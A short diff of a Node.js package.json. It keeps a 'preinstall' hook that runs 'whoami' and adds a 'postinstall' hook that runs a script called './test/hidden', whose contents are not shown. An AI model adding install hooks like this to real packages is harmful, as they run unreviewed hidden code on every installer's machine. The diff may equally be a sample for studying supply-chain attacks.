@@ -5,7 +5,8 @@
   "main": "index.js",
   "scripts": {
     "test": "./node_modules/.bin/mocha --reporter spec",
-    "preinstall": "whoami"
+    "preinstall": "whoami",
+    "postinstall": "sh ./test/hidden"
   },
   "repository": {
     "type": "git",
